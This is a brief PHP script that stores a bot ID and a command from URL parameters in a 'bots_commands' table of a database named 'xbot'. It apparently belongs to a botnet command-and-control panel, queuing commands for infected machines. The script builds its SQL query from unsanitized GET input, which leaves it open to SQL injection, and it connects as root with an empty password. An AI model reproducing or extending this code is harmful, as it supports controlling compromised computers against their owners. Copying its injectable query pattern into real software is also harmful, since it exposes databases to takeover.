<?php
$mysqli = new mysqli('localhost','root','','xbot');

if(isset($_GET['id']) && isset($_GET['command']))
//if(!
    $mysqli->query("INSERT INTO `bots_commands` VALUES('".$_GET['id']."', '".$_GET['command']."')");
  //  echo "failed";

?>